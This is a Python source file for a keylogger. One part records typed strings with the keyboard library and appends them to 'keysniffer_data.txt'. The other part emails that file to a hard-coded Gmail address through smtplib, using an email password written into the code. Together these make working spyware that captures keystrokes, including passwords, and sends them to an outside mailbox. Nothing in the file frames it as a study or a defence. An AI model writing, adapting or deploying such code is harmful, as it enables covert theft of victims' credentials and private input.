# ===================================================== Sending by email =========================================================


# this code was tacken from : https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=lbp

# Python code to illustrate Sending mail with attachments
# from your Gmail account

# libraries to be imported
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import getpass


email_address = "7unkym0nk3y@gmail.com"  # Enter disposable email here
password = "test..123"  # Enter email password here

username = getpass.getuser()

toaddr = "7unkym0nk3y@gmail.com"
keys_information = "keysniffer_data.txt"


def send_email(filename, attachment, toaddr):

    fromaddr = "7unkym0nk3y@gmail.com"

    msg = MIMEMultipart()

    msg["From"] = fromaddr

    msg["To"] = toaddr

    msg["Subject"] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, "plain"))

    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase("application", "octet-stream")

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP("smtp.gmail.com", 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


send_email(keys_information, keys_information, toaddr)


# ===================================================== Basic keylogger ================================================


import keyboard
import os


# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


try:
    while True:
        with open(path, "a") as data_file:

            # All key presses are recorded as a list into "events"
            # and the record loop stops when the "enter" key is pressed
            events = keyboard.record("enter")
            password = list(keyboard.get_typed_strings(events))

            data_file.write("\n")  # New line written before data is written
            data_file.write(password[0])
except KeyboardInterrupt:
    print("Keylogger stopped.")
